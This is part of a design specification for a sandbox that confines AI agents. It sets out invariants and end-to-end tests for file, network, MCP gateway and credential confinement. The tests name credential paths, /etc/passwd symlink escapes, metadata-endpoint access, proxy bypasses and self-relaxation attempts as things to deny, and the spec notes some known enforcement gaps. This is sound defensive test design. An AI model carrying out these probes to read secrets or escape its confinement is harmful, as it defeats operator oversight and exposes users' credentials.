<a id="fw-inv8"></a>**FW-INV8 — Credential floor.** No discovery path, no auto-widen rule, and no single-click operator action can grant access to a FW-CRED-matched location. Only the explicit typed exclude ([FW-CRED5](#fw-cred5)) can. A location is "matched" by credential *shape* wherever its denial was observed, and the floor is evaluated both when a candidate is proposed and again at accept (proposals are untrusted input), so neither over-capture nor a forged proposal opens a seam ([FW-DISC3](#fw-disc3)).

<a id="fw-inv9"></a>**FW-INV9 — No-oracle for credentials.** Denied credential paths and stripped credential env vars are indistinguishable, to the confined agent, from genuinely absent resources — no error text, code, or timing reveals existence.

<a id="fw-inv10"></a>**FW-INV10 — Discovery is non-authoritative.** A discovered candidate has no effect until accepted into an enforced Blueprint. Observation never itself widens a live enforced session, except within a pre-declared auto-widen zone.

<a id="fw-inv11"></a>**FW-INV11 — Structural floor.** Because the credential catalog compiles into the deny layer and deny is terminal ([FW-CAP8](#fw-cap8)), no allow, no rule order, no profile, and no discovery path can produce access to a floored location; the sole removal is the typed exclude ([FW-CRED5](#fw-cred5)). The structural form of [FW-INV8](#fw-inv8) (added by FEP-3).

<a id="fw-inv13"></a>**FW-INV13 — Broker non-disclosure.** A brokered credential's bytes do not appear in a confined process's environment, in a file or service it can read, or in any Gateway response to it.

<a id="fw-inv14"></a>**FW-INV14 — No out-of-sandbox execution.** A confined process cannot, through any channel its blueprint has not lifted, cause a process outside its session to execute a command, open a URL, or perform network egress.

<a id="fw-inv15"></a>**FW-INV15 — Unparsed is unforwarded.** No byte from a confined process reaches an upstream unless the engine parsed it as part of an admitted TLS ClientHello, an admitted request head, or the body or tunnel that follows one.

(The env-shading honesty guarantee — that the report discloses launcher-contingency — is carried by [FW-CRED8](#fw-cred8) rather than a standalone invariant, and is a specialization of [FW-INV5](#fw-inv5) report-soundness.)

## 7. End-to-end tests

Each test names a concrete scenario with Pass/Fail conditions. Filesystem and process tests run against both the in-simulator/dry-run compile path and real enforcement, and — except where a test is platform-specific — against both the Linux and macOS backends.

### 7.1 Filesystem confinement

<a id="fw-e2e-001"></a>**FW-E2E-001: Granted read succeeds, ungranted read denied.** A session is granted `read(/work/project/**)`. It reads a file inside the project (succeeds) and attempts to read `/work/other-project/secrets.env` (denied). Run under both spawn-confined and confine-self postures. Pass: in-scope read returns bytes; out-of-scope read returns EACCES-class error under both postures. Fail: any out-of-scope read succeeds, or an in-scope read is denied.

<a id="fw-e2e-002"></a>**FW-E2E-002: Write scope and read-only enforcement.** Granted `read(/work/**), write(/work/project/**)`. Writes inside the project succeed; a write to `/work/reference/` (read-granted only) is denied; a write to `/etc/` is denied. Pass: exactly the write-granted paths are writable. Fail: any write outside write scope succeeds.

<a id="fw-e2e-003"></a>**FW-E2E-003: Sensitive-set subtraction under a broad grant.** Granted broad `read($HOME/**)` with the default sensitive set subtracted. The session reads an ordinary file under `$HOME` (succeeds) and attempts `~/.ssh/id_ed25519`, `~/.aws/credentials`, and a sibling project directory (all denied). Pass: ordinary reads succeed while every sensitive-set path is denied despite the broad grant. Fail: any sensitive-set path is readable.

<a id="fw-e2e-004"></a>**FW-E2E-004: Symlink escape blocked.** Inside a writable directory the session creates a symlink pointing at `/etc/passwd` and at an ungranted sibling project, then reads and writes through the symlink. Pass: access through the symlink is denied — the target's scope governs, not the link's location. Fail: the symlink grants access to the target.

<a id="fw-e2e-005"></a>**FW-E2E-005: Descendant inheritance.** The confined session spawns `bash`, which spawns a child process that attempts an out-of-scope read and attempts to relax its own sandbox. Pass: the grandchild is denied and cannot re-grant; confinement is intact across the tree. Fail: any descendant reads out of scope or widens the grant.

<a id="fw-e2e-037"></a>**FW-E2E-037: Sensitive-set metadata does not leak.** A subtracted credential path is `stat()`ed under an otherwise-broad grant. Pass on macOS: existence, size, and mtime are denied (the `subtract` deny covers `file-read-metadata`), while metadata on non-sensitive ungranted paths still resolves ([FW-TRA4](#fw-tra4)). On Linux, where the residual is unenforceable, the capability is reported Partial and observed behavior matches the report. Fail: metadata of a sensitive path leaks on a platform that reports it denied, or the report over-claims ([FW-CAP7](#fw-cap7)).

<a id="fw-e2e-038"></a>**FW-E2E-038: Any-depth patterns deny at real depth.** A blueprint expressing `**/.env` is compiled and enforced over a project tree containing a nested `<proj>/.env`. Pass: the nested `.env` is denied at depth while a sibling non-secret file stays readable, and the pattern compiles byte-identically twice ([FW-FID4](#fw-fid4)). Fail: a matching path at depth is missed (a silent fail-open of the sensitive set, [FW-INV6](#fw-inv6)), or compilation is nondeterministic ([FW-CAP6](#fw-cap6)).

<a id="fw-e2e-039"></a>**FW-E2E-039: Tamper vectors are read-through, write-denied.** Under a writable project grant, a `write-subtract` set masks execution/policy-tampering vectors (`.git/hooks/**`, `.git/config`, `.mcp.json`, `.vscode/**`, shell rc). Pass: writing `<proj>/.git/config` is denied though the surrounding tree is writable, while reading it still succeeds so git and tooling keep working. Fail: any tamper path is writable under a normal project grant ([FW-TRA7](#fw-tra7)).

<a id="fw-e2e-107"></a>**FW-E2E-107: Exec allow-list under enforcement ([FW-ISO4](#fw-iso4)/[FW-ISO9](#fw-iso9)/[FW-XR6](#fw-xr6)).** An exec allow-list names one dynamically linked binary; a second names the directory that holds it. Each is enforced on Linux and on macOS. Pass: on both backends the listed binary, and a binary in the listed directory, run, and an unlisted binary the session can read is refused at `execve`; macOS reports the allow-list `Enforced`; Linux reports it `Partial`, and the gap it names holds: the loader granted with the listed binary runs an unlisted readable binary passed as its argument (`ld.so <file>`). Through `formwork run` on Linux, the unlisted program's failure names the exec rule to add. Fail: a listed binary does not start on either backend, an unlisted binary runs through `execve`, the Linux report omits the loader gap, or the loader stops running the unlisted binary while the report still says `Partial` (an under-claim).

### 7.2 Network / egress

<a id="fw-e2e-006"></a>**FW-E2E-006: Direct egress denied.** With `net: Deny`, the session runs `curl https://example.com`. Pass: the connection fails closed (no route to a network the process can reach). Fail: any bytes leave the host by a path other than the gateway.

<a id="fw-e2e-007"></a>**FW-E2E-007: Direct DNS denied.** The session attempts name resolution via the system resolver (UDP/TCP 53). Pass: direct resolution fails; name resolution is available only through the gateway. Fail: the process resolves names via a direct network path.

<a id="fw-e2e-008"></a>**FW-E2E-008: Proxy-env-bypass attempt.** A program that ignores `HTTP_PROXY`/`ALL_PROXY` and opens a raw socket to a remote host is run. Pass: the direct connection is denied; there is no cooperative-only bypass. Fail: the raw connection succeeds.

<a id="fw-e2e-009"></a>**FW-E2E-009: Optional port tier (Linux, ABI-gated).** With `net: Ports([8080])` and a loopback service on 8080 and 9090, the session connects to each. Pass on capable kernels: 8080 succeeds, 9090 denied. On kernels below Landlock net support: the capability is reported Unenforceable and the test asserts the report matches the (fail-closed) behavior rather than asserting port-level enforcement. Fail: behavior contradicts the report.

The egress tests drive the real gateway against loopback fixture upstreams and a controlled resolver that maps RFC 6761 `.test` names, never externally resolvable, to them: no test contacts an external host, and a refusal is asserted on the violation record (reason and host) the gateway emits instead of opening an upstream socket, never by waiting for a timeout (FEP-1's egress harness; FEP-6 §7.1).

<a id="fw-e2e-029"></a>**FW-E2E-029: Host allowlist admits one, denies the rest.** With `net: AllowHosts(["allowed.test"])` and the resolver mapping `allowed.test` / `blocked.test` to the two loopback fixtures, the session issues a request to each through the gateway, and separately attempts a direct `connect()` to both fixture addresses from inside the sandbox. Pass: `allowed.test` returns its fixture's bytes; `blocked.test` is refused at the gateway with a violation and no upstream socket; both direct `connect()`s fail (net is gateway-only). Fail: `blocked.test` is reached, or either fixture is reachable by direct connect.

<a id="fw-e2e-030"></a>**FW-E2E-030: Empty allowlist is full deny (CVE-2025-66479 regression).** A blueprint with an empty `AllowHosts([])` is compiled and enforced; the session requests `allowed.test`. Pass: the report shows egress denied, the gateway opens no upstream socket, and a violation is emitted — the empty list never degrades to allow-all; deterministic with no network at all. Fail: any egress succeeds.

<a id="fw-e2e-031"></a>**FW-E2E-031: Metadata/RFC-1918 blocked under a permissive allowlist.** With `AllowHosts(["*.test"])` (broad, but naming neither), the session asks the gateway to reach the literal `169.254.169.254` (IMDS) and a literal RFC-1918 address `10.0.0.1`. Pass: the gateway refuses both at the IP-range policy — a violation and no socket — regardless of anything listening; IMDS is unreachable. Fail: either is reached without being named explicitly.

<a id="fw-e2e-032"></a>**FW-E2E-032: Egress fidelity is honest.** The resolver maps two names, `a.test` and `b.test`, to the *same* loopback fixture; the blueprint tunnels only `a.test` (`tunnel:a.test`). A request bearing host `a.test` is allowed; the test records that the gateway, which does not terminate TLS for a tunnel, cannot distinguish it from a request that means `b.test`'s content on that shared address. Pass: the report marks host-scoped egress `Partial` with the tunnel-grade reason ([FW-EGR5](#fw-egr5)) and observed behavior matches it exactly (the [FW-E2E-025](#fw-e2e-025) honesty pattern applied to egress). Fail: the report claims `Enforced`, or behavior contradicts it. *(Amended at reintegration for the tunnel grade.)*

<a id="fw-e2e-075"></a>**FW-E2E-075: Sole egress path (both).** Under `rules = ["tunnel:allowed.test"]`, a request through `HTTP_PROXY` reaches the fixture; a direct `connect()` to the fixture, a direct `connect()` to `169.254.169.254`, an unregistered (Linux) or uncredentialed (macOS) connection to the listener, a UDP send, and `getaddrinfo("blocked.test")` are each attempted. Pass: the proxied request succeeds and each direct attempt is denied with a violation record. Fail: any direct attempt succeeds.

<a id="fw-e2e-076"></a>**FW-E2E-076: Pathname socket (both).** Three sockets, each with an unconfined control: one bound by an out-of-session fixture, one granted by `allow`, one bound in-session. Pass: the first is refused and the other two connect. Fail: the first connects, or a granted one is refused.

<a id="fw-e2e-077"></a>**FW-E2E-077: Inspected path scope (both).** Under `post:allowed.test/repos/acme/**`. Pass: `POST /repos/acme/x` passes; `POST /repos/other/x` and `GET /repos/acme/x` are refused with a generic 403 and an operator-channel line naming the rule. Fail: either refused request reaches the fixture, or the 403 body names the rule.

<a id="fw-e2e-078"></a>**FW-E2E-078: Brokered header (both).** Under `allow-credentials = ["broker:anthropic"]` bound to `allowed.test`. Pass: the fixture receives the credential in `x-api-key`; the confined `env` shows the placeholder; the Catalog file is unreadable; the placeholder sent to `other.test` is refused; the credential bytes appear on no confined-readable surface the test can enumerate ([FW-INV13](#fw-inv13)). Fail: any of these does not hold.

<a id="fw-e2e-091"></a>**FW-E2E-091: Loopback callback (macOS).** A confined process binds `localhost:<ephemeral>` and an unconfined control process connects and sends a nonce, under `net = "deny"`, `ports` and a host rule. Pass: the confined process receives the nonce under each posture. Fail: the bind or the accept is denied.

<a id="fw-e2e-092"></a>**FW-E2E-092: Chunked and large uploads (both).** Against an inspected fixture: a `git push` of a pack larger than 1 MiB, and a 256 MiB `POST` from curl. Pass: the fixture receives both bodies byte-identical, and the Gateway's resident memory grows by less than 16 MiB during the upload. Fail: either body differs or stalls, or memory grows past the bound.

<a id="fw-e2e-093"></a>**FW-E2E-093: Streaming (both).** A fixture emits server-sent events, one every 20 ms, on an inspected host with a brokered credential, in streams of 250, until at least 1,000 events are measured. Pass: the 95% interval for the 99th percentile of the events' delays -- from the fixture writing an event to the client reading it -- lies under 20 ms times the node factor of [FW-E2E-096](#fw-e2e-096). Fail: it lies over, or still straddles the budget after 4,000 events. (Amended: "every event" is the maximum, the most noise-sensitive statistic on a shared runner; a 200 ms cadence over 30 s yields too few events for an interval.)

<a id="fw-e2e-094"></a>**FW-E2E-094: Client matrix (both).** curl, git, Python `requests`, Python `urllib`, pip, Node `fetch` and `https` with the Launcher's variables, npm, Go `net/http`, uv, cargo and rustup each fetch from a tunnel fixture and an inspected fixture. Pass: the results match the matrix recorded in the repository, which also records name-constraint enforcement per client. Fail: a result differs from the recorded matrix.

<a id="fw-e2e-095"></a>**FW-E2E-095: Upstream reuse (both).** Twenty sequential requests from one client to one inspected fixture. Pass: the fixture observes one TLS handshake. Fail: more than one.

<a id="fw-e2e-096"></a>**FW-E2E-096: Latency budget (both).** Medians over 1,000 requests against a loopback fixture, compared with the same client connecting directly: each sample pairs the request direct and through the Gateway, in alternating order, and the statistic is the median of the pairs' differences with a distribution-free 95% interval. The budget is the §8 target times the node's speed relative to a reference node -- a calibration workload of TLS handshakes and records on the Gateway's provider, timed between batches -- clamped to [1, 3]. Pass: the interval lies under the budget. Fail: it lies over, or still straddles it after 4,000 pairs. (Amended: a fixed bound on a shared runner is a flaky test, constitution *Testing*.)

<a id="fw-e2e-097"></a>**FW-E2E-097: Session CA shape (both).** Pass: the bundle's session certificate is a CA with path length 0 and the name constraints [FW-EGR25](#fw-egr25) lists; no file under the session scratch, `$HOME` or the temporary directories contains the CA private key after the session starts; the leaf for an inspected host verifies with `openssl verify` against the bundle. Fail: any of these does not hold.

### 7.3 Transport / fd seam (retired)

The injected-fd seam these tests verified was retired unwired (§2, [FW-GW6](#fw-gw6)); the transport that shipped is tested by [FW-E2E-075](#fw-e2e-075), [FW-E2E-076](#fw-e2e-076) and [FW-ADV-018](#fw-adv-018), and the MCP stdio path by §7.4. The numbers stay retired.

<a id="fw-e2e-010"></a>**FW-E2E-010: MCP over injected fd with zero net.** *(Retired with the seam.)* An agent under `net: Deny` completed an MCP exchange over one injected fd.

<a id="fw-e2e-011"></a>**FW-E2E-011: fd minting via SCM_RIGHTS.** *(Retired with the seam.)* The gateway passed the agent a new connected fd over its control fd, with no in-sandbox `connect()`.

<a id="fw-e2e-012"></a>**FW-E2E-012: No dependence on socket-path gating.** *(Retired with the seam.)* The workload behaved identically with the gateway's socket path granted or denied.

### 7.4 Gateway / MCP shading

<a id="fw-e2e-013"></a>**FW-E2E-013: Tool invisibility.** A backend exposes tools `read_file`, `write_file`, `http_fetch`. Policy grants `read_file` only. The agent calls `tools/list`. Pass: only `read_file` appears; the others are absent, not present-and-flagged. Fail: an ungranted tool appears in the listing.

<a id="fw-e2e-014"></a>**FW-E2E-014: Ungranted call refused as not-found.** The agent calls `http_fetch` by its exact name despite it being hidden. Pass: the call is refused, and the error is shaped like a genuine absence (matches a "unknown tool / not available" pattern) rather than "permission denied" — no oracle that confirms the tool exists. Fail: the call executes, or the error reveals that the tool exists but is blocked.

<a id="fw-e2e-015"></a>**FW-E2E-015: Resource and prompt shading.** The backend exposes resources and prompts; policy grants a subset. The agent lists and reads both. Pass: only granted resources/prompts are listed, readable, and gettable; ungranted ones are absent and non-fetchable by direct URI/name. Fail: any ungranted resource or prompt is listed or fetchable.

<a id="fw-e2e-016"></a>**FW-E2E-016: `list_changed` re-filtering.** After connection, the backend adds a new tool and emits `notifications/tools/list_changed`. The new tool is not in policy. Pass: the gateway re-applies policy; the new tool stays hidden and non-invocable. Fail: the runtime-added tool becomes visible or callable.

<a id="fw-e2e-017"></a>**FW-E2E-017: Sampling/elicitation policing.** A backend issues a server→client `sampling/createMessage` request. Policy denies sampling for that server. Pass: the request is refused at the gateway and never reaches the agent/model. Fail: the sampling request passes through.

<a id="fw-e2e-018"></a>**FW-E2E-018: Transparent passthrough for granted items.** For a granted tool, the request and response bytes observed by the agent are semantically identical to those from talking to the backend directly (compared against a direct-connection ground truth). Pass: no semantic divergence for granted traffic. Fail: the gateway mangles or reshapes granted request/response content.

<a id="fw-e2e-019"></a>**FW-E2E-019: Backend confinement recursion.** The gateway spawns a stdio MCP backend whose grant is `read(/srv/data/**)`. The backend attempts to read `/work/project` and to open a direct network connection. Pass: the backend is confined to its own grant — both attempts denied. Fail: the spawned backend has broader access than its grant.

<a id="fw-e2e-065"></a>**FW-E2E-065: Regex allow shades the listing ([FW-GW9](#fw-gw9)).** A backend exposes a spread of tool names (`read_file`, `list_dir`, `write_file`, `delete_file`, `http_fetch`). Policy grants `tools = { allow = ["/read_.*/", "/list_.*/"] }`. The agent calls `tools/list`. Pass: exactly the pattern-matched names (`read_file`, `list_dir`) appear; the rest are absent, indistinguishable from an exact allowlist. Fail: a non-matching tool appears, or a matching one is hidden.

<a id="fw-e2e-066"></a>**FW-E2E-066: Deny is terminal over allow ([FW-GW9](#fw-gw9)/[FW-CAP8](#fw-cap8)).** Under `tools = { allow = ["/.*/"], deny = ["/delete_.*/", "http_fetch"] }`, the agent lists tools and calls a deny-matched name. Pass: deny-matched tools are absent from `tools/list` despite allow-all, the guessed call is refused, and a name matching allow *and* deny is removed (deny wins); a name the deny does not match still round-trips. Fail: a deny-matched tool is listed or callable, or the overlap resolves to allow.

<a id="fw-e2e-067"></a>**FW-E2E-067: Deny stays oracle-free ([FW-GW9](#fw-gw9)/[FW-ADV-004](#fw-adv-004)).** With a deny pattern hiding a real backend tool, the agent calls the hidden-but-real name and a nonexistent name that also matches the deny. Pass: both are refused with the same error code and an identical message shape (modulo the echoed name), so the deny does not confirm the tool exists. Fail: the refusals differ, or the message says "denied".

<a id="fw-e2e-069"></a>**FW-E2E-069: Pattern policy compiles and fails loud ([FW-GW9](#fw-gw9)/[FW-FID4](#fw-fid4)/[FW-INV6](#fw-inv6)).** Black-box through the CLI on any host (dry-run compile, no kernel): a blueprint with `tools = { allow = ["/re/", …], deny = ["/re/"] }` compiles, the allow/deny patterns survive verbatim into the compiled `gateway.servers.<s>.tools`, and recompiling is byte-identical. A `/…/` that will not compile and an empty `{}` table each make the compile exit non-zero with the reason named. Pass: patterns round-trip and malformed input fails loud. Fail: a pattern is dropped or reordered nondeterministically, or a bad pattern/empty table silently compiles.

<a id="fw-e2e-068"></a>**FW-E2E-068: Pattern shading against a real MCP server ([FW-GW9](#fw-gw9)).** In a Linux container, the gateway fronts a real published server (`@modelcontextprotocol/server-everything`, pinned) spawned as the backend, driven through the production shading path (`Gateway::run`, what the `formwork gateway` CLI wraps). Policy is a regex allow/deny over that server's real tool names. Driven as an MCP host would (initialize, `tools/list`, `tools/call`): every listed tool matches the allow set and none match the deny; an allowed tool round-trips; both an allow-miss and a deny-matched real tool are refused, oracle-free and identically. Skips (never fails) where the host lacks node. Isolates shading so it runs without a host confiner; the backend-confinement arm ([FW-GW5](#fw-gw5)) is host-gated and covered by [FW-E2E-019](#fw-e2e-019). Pass: shading holds end-to-end against a server Formwork did not write. Fail: a denied real tool is listed or callable, or an allowed one is shaded out.

### 7.5 Transparency & reuse

<a id="fw-e2e-020"></a>**FW-E2E-020: pytest reuse, zero denials.** A real Python repository with installed dependencies and a populated cache is present on the host. Under the default profile with the project writable and the interpreter/site-packages/cache read-only, the session runs `pytest`. Pass: the suite runs to its normal result with no sandbox-induced denials in the run log. Fail: any denial forces a test error that would not occur outside the sandbox.

<a id="fw-e2e-021"></a>**FW-E2E-021: node/npm reuse.** The session runs `npm test` (or a node script) against host `node_modules` and the npm cache, read-only. Pass: the script runs as it would unsandboxed, modulo network, with no denials in the common case. Fail: a denial breaks an otherwise-passing run.

<a id="fw-e2e-022"></a>**FW-E2E-022: git works; push gated.** The session runs `git status`, `git diff`, and `git commit` within the project (succeed) and `git push` (network). Pass: local git operations succeed within scope; `git push` is blocked unless routed through the gateway. Fail: local git is broken by confinement, or push egresses directly.

<a id="fw-e2e-023"></a>**FW-E2E-023: Graceful degradation on optional paths.** A tool probes an optional, ungranted config path (e.g., `~/.config/tool/optional.toml`) as part of normal startup. Pass: the probe receives a standard errno and the tool continues with defaults. Fail: the probe crashes the tool or produces a sandbox-specific error the tool cannot handle.

<a id="fw-e2e-036"></a>**FW-E2E-036: Secret-shaped environment scrub, allowlist survives.** Under the default profile, a confined child is launched via `formwork run` and its environment inspected. Pass: name- or value-secret-shaped vars (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, a PEM-valued variable) are absent, while a blueprint-allowlisted `ANTHROPIC_API_KEY` survives so the workload still reaches its model API. Fail: any secret-shaped var reaches the child, or an allowlisted var is stripped. The scrub is heuristic, so the capability is reported Partial ([FW-INV5](#fw-inv5)), never a silent over-claim ([FW-ENV1](#fw-env1)/2).

<a id="fw-e2e-084"></a>**FW-E2E-084: Agent examples under the baseline (both).** Each shipped `examples/` blueprint runs its agent's non-interactive smoke command with the baseline on; the Claude Code login flow runs with the fixture opener standing in for the browser. Pass: zero denials outside the lift set the example documents. Fail: any other denial, including a write to `~/.claude` under the default profile.

### 7.6 Fidelity & operability

<a id="fw-e2e-024"></a>**FW-E2E-024: Report soundness.** For a rich blueprint, `compile()` yields a report. For every capability marked `Enforced`, a paired probe asserts the allowed operation succeeds and the denied operation fails. Pass: every `Enforced` claim survives its probe pair; nothing marked `Enforced` is bypassable by the probe suite. Fail: any `Enforced` capability is bypassable, or any probe contradicts the report.

<a id="fw-e2e-025"></a>**FW-E2E-025: Report honesty on a degraded host.** On a kernel lacking Landlock network support, a blueprint requesting `net: Ports([...])` is compiled and enforced. Pass: the net-port capability is reported Partial/Unenforceable, the fail-closed deny still holds (no egress), and observed behavior matches the report exactly. Fail: the report claims port enforcement that does not hold, or egress leaks.

<a id="fw-e2e-026"></a>**FW-E2E-026: Dry-run compile without enforcement.** `compile()` runs on a host lacking Landlock, and on macOS compiling a Linux profile. Pass: a policy and report are produced and nothing is enforced on the running process. Fail: `compile()` requires kernel support, mutates the process, or crashes.

<a id="fw-e2e-027"></a>**FW-E2E-027: Deterministic compile.** The same blueprint is compiled twice. Pass: byte-identical policy and report. Fail: any nondeterministic difference.

<a id="fw-e2e-028"></a>**FW-E2E-028: Cross-platform equivalence.** The same blueprint is enforced on Linux and macOS and exercised by the section 7.1–7.5 workloads. Pass: for the enforceable intersection, observable behaviors match across platforms; all differences are reflected in the FidelityReport, not in silent behavior. Fail: an observable behavior differs across platforms without a corresponding report entry.

<a id="fw-e2e-086"></a>**FW-E2E-086: Exit codes (both).** A workload exiting 3; then a run whose Gateway is killed mid-session. Pass: the first makes `run` exit 3 with nothing of its own on stdout; the second exits 125 with the attribution line on stderr and stdout untouched. Fail: stdout carries a Formwork line, or the code differs.

<a id="fw-e2e-087"></a>**FW-E2E-087: Host-session detection (both).** Pass on a bare Linux runner: `detect` reports each channel `not present on this host`. Pass with the FEP-5 §6.1 fixture session: `detect` names the bus, user-manager and display sockets, `run` prints the matching `Partial` line, and the same run under supervised connect prints `Enforced`. Pass on macOS: `detect` reports the GUI-session verdict and the channel lines match [FW-E2E-081](#fw-e2e-081). Fail: a present facility is reported absent or the reverse.

<a id="fw-e2e-089"></a>**FW-E2E-089: Launcher-owned paths under `closed` (both).** A blueprint with `mode = "unveil"` and only `readwrite:$CWD/**`. Pass: `$TMPDIR` is set inside the session and writable, and on macOS `confstr(_CS_DARWIN_USER_TEMP_DIR)` resolves beneath it; a grandchild reads the session CA bundle, `/proc/self/status` and `/etc/hosts`; `explain` names the tmp directory and the CA path. Fail: any read is denied or a path is undisclosed.

### 7.7 Blueprint model & format

<a id="fw-e2e-041"></a>**FW-E2E-041: Rename regression.** *(Retired with the `--spec` compat alias. This was a transitional regression guard for the spec → Blueprint rename — never tied to a numbered requirement — and its number stays retired now that the alias is gone. Byte-deterministic compile is covered by [FW-E2E-026](#fw-e2e-026)/027.)*

<a id="fw-e2e-042"></a>**FW-E2E-042: Override precedence.** A path allowed in the file is denied by a CLI `--subtract` layered over it; a deny and an allow at equal precedence resolve to deny. Pass: merge follows baseline → extends → file → CLI ([FW-BP2](#fw-bp2)), postures last-set-wins, path sets additive, with deny-beats-allow at ties. Fail: any ordering or tie deviation.

<a id="fw-e2e-043"></a>**FW-E2E-043: CLI/file parity.** The same grant authored in the file and expressed via CLI flag produce identical compiled policy. Pass: byte-identical policy from both surfaces. Fail: divergence.

<a id="fw-e2e-044"></a>**FW-E2E-044: `extends` composition.** A Blueprint extending a base merges deterministically; an `extends` cycle is detected. Pass: deterministic merge; cycle errors clearly. Fail: nondeterministic merge or an undetected cycle.

<a id="fw-e2e-055"></a>**FW-E2E-055: Path sigils scope a grant ([FW-BP5](#fw-bp5)).** A blueprint grants `$CWD/**` and is run from a project directory. Pass: a file under the launch directory is readable while a sibling outside it is denied by the real kernel; `~` still expands to `$HOME`; a non-sigil path is untouched; and `$CWD` resolving to `$HOME` or `/` warns (a broad-grant nudge) rather than silently widening. Fail: a path outside `$CWD` is granted, or a sigil expands wrong.

<a id="fw-e2e-056"></a>**FW-E2E-056: Create/write split ([FW-CAP9](#fw-cap9)).** The `modify` verb compiles to every `file-write-*` op except `file-write-create`; under real Seatbelt a paired allow/deny probe shows an existing file modifiable but a new file/dir uncreatable. Pass: modify allowed, create (file and dir) denied. Fail: create succeeds, or modify is denied.

<a id="fw-e2e-057"></a>**FW-E2E-057: Mode posture ([FW-BP7](#fw-bp7)).** `mode` compiles identically to the equivalent `[fs] read-mode` for both values, and a child's `mode` overrides a base's `read-mode` across `extends` while both-in-one-layer errors loud. Pass: byte-identical compile; last-wins across layers; same-layer conflict rejected. Fail: divergence, or a same-layer conflict silently picked.

<a id="fw-e2e-058"></a>**FW-E2E-058: Rule order independence ([FW-BP6](#fw-bp6)/[FW-CAP8](#fw-cap8)).** The same verb rules in different orders compile to the same policy, and a deny beats an allow regardless of order. Pass: order-independent compile; deny terminal. Fail: order changes the policy, or an allow reopens a deny.

<a id="fw-e2e-061"></a>**FW-E2E-061: Rule/table parity ([FW-BP1](#fw-bp1)).** Grants authored as flat verb rules and as the nested `[fs]` table compile byte-identically. Pass: byte-identical policy from both. Fail: divergence.

<a id="fw-e2e-059"></a>**FW-E2E-059: Explain names the winning rule and provenance ([FW-FID6](#fw-fid6)).** `explain <path>` over a layered blueprint reports, per path, the read/write/exec verdict, the deciding rule, and its origin: a granted path names the file rule; a `--rule` deny is terminal and attributed to `cli`; a credential-floor path is denied as `built-in`; an unlisted path under `unveil` is hidden, not ambient; an `exec:` grant shows execute even where read is closed (FW-ISO9/FW-XR6). Pass: each verdict names the right rule and origin without enforcing. Fail: a wrong rule/origin, or a deny that does not win.

<a id="fw-e2e-060"></a>**FW-E2E-060: CLI overrides compose with an `unveil` blueprint ([FW-BP1](#fw-bp1)/[FW-BP2](#fw-bp2)/[FW-BP7](#fw-bp7)).** Over an empty-universe (`unveil`) file, the CLI override surface behaves as an operator expects: a `--read`/`--write` sugar grant fills the closed universe (write implies read); `--rule exec:` closes exec to an allow-list on a separate axis (the listed binary runs but is unreadable, an unlisted one does not run); the `--mode unveil` flag flips a subtractive file to closed by last-wins (ambient-only path hidden, explicit grant kept); and the credential floor stays un-liftable under a broad `--read`. Pass: each verdict matches, dry-run on any host. Fail: a CLI grant that does not populate the universe, an exec allow-list that leaks, a mode flag that does not override, or a floor a `--read` lifts.

<a id="fw-e2e-070"></a>**FW-E2E-070: Discovery walk stays inside the trust boundary ([FW-BP8](#fw-bp8)).** Dry-run on any host. A `FORMWORK.toml` planted (a) in an ancestor directory the invoking user does not own, (b) above a symlinked `$HOME` (the walk reaching territory a textual home comparison would miss), and (c) as a foreign-owned file inside the user's own directory. Pass: none of the planted files governs a session — (a) ends the walk unconsulted, (b) stops at the resolved home, (c) is refused with a warning and does not fall through to a farther match — while the user's own launch-directory file still resolves, and `--blueprint` still opens any file explicitly. Ownership is exercised with an injected predicate at the unit boundary (chown requires root; the same pure-substitution allowance as the compiler's HostProfile), the symlinked-home arm against the real filesystem. Fail: implicit policy from territory the user does not control.

### 7.8 Credential catalog & launcher

<a id="fw-e2e-045"></a>**FW-E2E-045: Path credential denied and itemized.** Under the default catalog, `~/.aws/credentials` is read. Pass: read denied (EACCES); operator channel names type `aws`; agent sees a bare EACCES with no annotation. Fail: read succeeds, or the agent-facing error names the type.

<a id="fw-e2e-046"></a>**FW-E2E-046: Env credential stripped and absent in tree.** `AWS_SECRET_ACCESS_KEY` is present in Formwork's own environment. The confined process and a grandchild read it. Pass: absent in both (empty/None); operator channel names it stripped as `aws`; agent cannot distinguish it from never-set. Fail: the variable is present anywhere in the tree.

<a id="fw-e2e-047"></a>**FW-E2E-047: Env-points-to-file dual arm.** With `gcp` enforced (default deny) and `GOOGLE_APPLICATION_CREDENTIALS` set to a real path. Pass: the variable is stripped and the referenced file is denied. Fail: either arm misses.

<a id="fw-e2e-048"></a>**FW-E2E-048: Exclude-by-type un-blocks exactly one.** `--allow-cred aws`. Pass: aws path/env become accessible/present while ssh, anthropic, slack, etc. remain blocked/stripped. Fail: any adjacent type is affected.

<a id="fw-e2e-049"></a>**FW-E2E-049: Generic backstop.** An uncatalogued but sensitive-shaped location (a novel `~/.someprovider/credentials`, an unusual `.env` variant). Pass: denied by the backstop despite no curated entry. Fail: the uncatalogued secret is accessible.

<a id="fw-e2e-050"></a>**FW-E2E-050: Report mechanism labeling.** Pass: FidelityReport marks env-kind types `enforced-via-launcher` and path-kind types `enforced-via-OS-sandbox`, carries the launcher-contingency note for env, and marks any-depth floor rows Partial where the host cannot root them ([FW-CRED9](#fw-cred9)). Fail: mislabeled or missing mechanism.

### 7.9 Discovery

<a id="fw-e2e-051"></a>**FW-E2E-051: Learning proposes toolchain, omits secrets.** A learning run of a real workload that needs ordinary toolchain paths and also touches a credential. Pass: the proposal includes the ordinary paths the run needed and omits every FW-CRED-matched path however hard it was hit; the withheld itemization goes to the operator channel. Fail: a credential path appears as a candidate grant.

<a id="fw-e2e-052"></a>**FW-E2E-052: Auto-widen zone boundary.** A discovered path inside the declared zone and one just outside it. Pass: the in-zone path self-grants on the next run; the out-of-zone path requires review and is not auto-granted. Fail: an out-of-zone path self-grants.

<a id="fw-e2e-053"></a>**FW-E2E-053: Provenance recorded.** An accepted discovered grant. Pass: it appears in the discovered layer tagged with discovery provenance and run id, distinguishable from authored grants. Fail: no provenance, or indistinguishable from authored.

<a id="fw-e2e-054"></a>**FW-E2E-054: Discovery non-authoritative.** A denial observed in learning mode, outside any auto-widen zone. Pass: the live enforced session is not widened; the operation still fails in that run. Fail: observation silently widened the session.

